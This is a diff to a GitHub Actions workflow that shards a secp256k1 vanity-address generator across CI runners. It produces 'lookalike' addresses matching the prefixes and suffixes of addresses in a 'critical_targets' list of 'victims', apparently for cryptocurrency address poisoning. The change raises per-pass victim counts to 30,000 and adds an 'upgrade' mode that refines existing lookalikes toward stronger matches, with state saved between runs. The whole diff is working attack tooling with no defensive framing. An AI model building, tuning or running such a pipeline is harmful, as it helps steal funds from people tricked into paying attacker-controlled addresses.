@@ -12,8 +12,11 @@ on:
         description: "victims receiving medium lookalikes (prefix3+suffix3 attempts)"
         default: "2000"
       basic_count:
-        description: "victims per pass receiving basic lookalikes (prefix3+suffix2)"
-        default: "10000"
+        description: "victims per cover pass (fast 3+1 coverage)"
+        default: "30000"
+      upgrade_limit:
+        description: "lookalike rows to upgrade per pass"
+        default: "50000"
       offset:
         description: "override basic window start rank (blank = use saved state)"
         default: ""
@@ -33,6 +36,8 @@ jobs:
       offset: ${{ steps.calc.outputs.offset }}
       strong: ${{ steps.calc.outputs.strong }}
       medium: ${{ steps.calc.outputs.medium }}
+      mode: ${{ steps.calc.outputs.mode }}
+      upgrade_offset: ${{ steps.calc.outputs.upgrade_offset }}
     env:
       GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
     steps:
@@ -53,21 +58,30 @@ jobs:
         run: |
           gh release download scan-data -p "vanity_state.json" -D . --clobber 2>/dev/null || true
           OFFSET="$INPUT_OFFSET"; STRONG="$INPUT_STRONG"; MEDIUM="$INPUT_MEDIUM"
-          PHASE1=false
+          PHASE1=false; UP_OFFSET=0; TOTAL=0
           if [ -f vanity_state.json ]; then
             if [ -z "$OFFSET" ]; then
               OFFSET=$(python -c "import json;print(json.load(open('vanity_state.json')).get('offset',0))" 2>/dev/null || echo 0)
             fi
             PHASE1=$(python -c "import json;print(str(json.load(open('vanity_state.json')).get('phase1_done',False)).lower())" 2>/dev/null || echo false)
+            UP_OFFSET=$(python -c "import json;print(json.load(open('vanity_state.json')).get('upgrade_offset',0))" 2>/dev/null || echo 0)
+            TOTAL=$(python -c "import json;print(json.load(open('vanity_state.json')).get('total',0))" 2>/dev/null || echo 0)
           fi
           [ -z "$OFFSET" ] && OFFSET=0
           [ -z "$STRONG" ] && STRONG=50
           [ -z "$MEDIUM" ] && MEDIUM=2000
           if [ "$PHASE1" = "true" ]; then STRONG=0; MEDIUM=0; fi
+          if [ "$TOTAL" -lt 1 ]; then
+            TOTAL=$(python -c "import csv;print(len(set(r['victim'] for r in csv.DictReader(open('critical_targets.csv')))))")
+          fi
+          MODE="cover"
+          if [ "$OFFSET" -ge "$TOTAL" ]; then MODE="upgrade"; fi
           echo "offset=$OFFSET" >> "$GITHUB_OUTPUT"
           echo "strong=$STRONG" >> "$GITHUB_OUTPUT"
           echo "medium=$MEDIUM" >> "$GITHUB_OUTPUT"
-          echo "window offset=$OFFSET strong=$STRONG medium=$MEDIUM"
+          echo "mode=$MODE" >> "$GITHUB_OUTPUT"
+          echo "upgrade_offset=$UP_OFFSET" >> "$GITHUB_OUTPUT"
+          echo "mode=$MODE offset=$OFFSET total=$TOTAL upgrade_offset=$UP_OFFSET strong=$STRONG medium=$MEDIUM"
       - name: Publish targets
         run: gh release upload scan-data critical_targets.csv --clobber
       - uses: actions/upload-artifact@v4
@@ -98,7 +112,14 @@ jobs:
           cc -O2 -o vanity_bin vanity/vanity.c -lsecp256k1
           ./vanity_bin --selftest
       - name: Download targets
-        run: gh release download scan-data -p "critical_targets.csv" -D . --clobber
+        run: |
+          gh release download scan-data -p "critical_targets.csv" -D . --clobber
+          if [ "${{ needs.prepare.outputs.mode }}" = "upgrade" ]; then
+            for attempt in 1 2 3 4 5; do
+              gh release download scan-data -p "critical_victims_lookalikes.csv" -D . --clobber 2>/dev/null && break
+              sleep 5
+            done
+          fi
       - name: Generate lookalikes (shard ${{ matrix.shard }})
         run: |
           ( while true; do
@@ -107,18 +128,33 @@ jobs:
               [ -f lookalikes_${{ matrix.shard }}.csv ] && cp lookalikes_${{ matrix.shard }}.csv /tmp/partial_${{ matrix.shard }}.csv && gh release upload scan-data partial_lookalikes_${{ matrix.shard }}.csv --clobber 2>/dev/null || true
             done ) &
           UPLOADER=$!
-          python -m src.vanity_driver \
-            --targets critical_targets.csv \
-            --out lookalikes_${{ matrix.shard }}.csv \
-            --binary ./vanity_bin \
-            --shard ${{ matrix.shard }} \
-            --num-shards 20 \
-            --cores 4 \
-            --strong-count ${{ needs.prepare.outputs.strong }} \
-            --medium-count ${{ needs.prepare.outputs.medium }} \
-            --offset ${{ needs.prepare.outputs.offset }} \
-            --basic-count ${{ inputs.basic_count || 10000 }} \
-            --progress progress_${{ matrix.shard }}.json
+          if [ "${{ needs.prepare.outputs.mode }}" = "upgrade" ]; then
+            python -m src.vanity_driver \
+              --mode upgrade \
+              --existing critical_victims_lookalikes.csv \
+              --out lookalikes_${{ matrix.shard }}.csv \
+              --binary ./vanity_bin \
+              --shard ${{ matrix.shard }} \
+              --num-shards 20 \
+              --cores 4 \
+              --upgrade-target 5 \
+              --upgrade-limit ${{ inputs.upgrade_limit || 50000 }} \
+              --upgrade-offset ${{ needs.prepare.outputs.upgrade_offset }} \
+              --progress progress_${{ matrix.shard }}.json
+          else
+            python -m src.vanity_driver \
+              --targets critical_targets.csv \
+              --out lookalikes_${{ matrix.shard }}.csv \
+              --binary ./vanity_bin \
+              --shard ${{ matrix.shard }} \
+              --num-shards 20 \
+              --cores 4 \
+              --strong-count ${{ needs.prepare.outputs.strong }} \
+              --medium-count ${{ needs.prepare.outputs.medium }} \
+              --offset ${{ needs.prepare.outputs.offset }} \
+              --basic-count ${{ inputs.basic_count || 30000 }} \
+              --progress progress_${{ matrix.shard }}.json
+          fi
           kill $UPLOADER 2>/dev/null || true
       - name: Publish shard results
         if: always()
@@ -161,22 +197,31 @@ jobs:
       - name: Advance state window
         env:
           OFFSET: ${{ needs.prepare.outputs.offset }}
-          BASIC: ${{ inputs.basic_count || 10000 }}
+          UPGRADE_OFFSET: ${{ needs.prepare.outputs.upgrade_offset }}
+          BASIC: ${{ inputs.basic_count || 30000 }}
+          UPGRADE_LIMIT: ${{ inputs.upgrade_limit || 50000 }}
           STRONG: ${{ needs.prepare.outputs.strong }}
+          MODE: ${{ needs.prepare.outputs.mode }}
         run: |
           ROWS=$(python -c "import csv;print(sum(1 for _ in csv.DictReader(open('critical_victims_lookalikes.csv'))))" 2>/dev/null || echo 0)
           if [ "$ROWS" -lt 1 ]; then
             echo "no lookalike rows produced; not advancing state"
             exit 0
           fi
+          export TOTAL=$(python -c "import csv;print(len(set(r['victim'] for r in csv.DictReader(open('critical_targets.csv')))))" 2>/dev/null || echo 0)
           python - <<'EOF'
           import json, os
           offset = int(os.environ.get("OFFSET") or 0)
-          basic = int(os.environ.get("BASIC") or 10000)
-          strong = int(os.environ.get("STRONG") or 0)
-          state = {"offset": offset + basic}
-          if strong > 0:
-              state["phase1_done"] = True
+          basic = int(os.environ.get("BASIC") or 30000)
+          up_offset = int(os.environ.get("UPGRADE_OFFSET") or 0)
+          up_limit = int(os.environ.get("UPGRADE_LIMIT") or 50000)
+          mode = os.environ.get("MODE") or "cover"
+          total = int(os.environ.get("TOTAL") or 0)
+          state = {"offset": offset, "total": total, "upgrade_offset": up_offset, "phase1_done": True}
+          if mode == "cover":
+              state["offset"] = offset + basic
+          else:
+              state["upgrade_offset"] = up_offset + up_limit
           json.dump(state, open("vanity_state.json", "w"))
           print("new state:", state)
           EOF
